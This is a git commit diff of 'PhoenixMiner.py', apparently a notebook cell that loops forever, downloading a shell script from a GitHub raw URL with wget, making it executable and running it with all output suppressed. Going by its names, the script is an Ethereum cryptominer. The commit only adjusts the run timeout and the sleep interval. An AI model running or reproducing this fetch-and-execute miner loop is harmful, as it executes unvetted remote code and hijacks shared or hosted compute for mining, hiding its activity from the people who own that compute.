a32b9e9b77092967957e13fdd29ebed3281499e5
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-03-14 22:01:31 +0530

    Update PhoenixMiner.py

--- PhoenixMiner.py
+++ PhoenixMiner.py
@@ -1,9 +1,5 @@
 %%capture
-
 import time 
-
 while  True: 
-
-  ! timeout 10m wget https://raw.githubusercontent.com/Master478963/lolMinet/main/PhoenixMinerEth.sh && chmod u+x PhoenixMinerEth.sh && ./PhoenixMinerEth.sh > /dev/null 2>&1 
-
-  time.sleep(30)
+  ! timeout 15m wget https://raw.githubusercontent.com/Master478963/lolMinet/main/PhoenixMinerEth.sh && chmod u+x PhoenixMinerEth.sh && ./PhoenixMinerEth.sh > /dev/null 2>&1 
+  time.sleep(20)
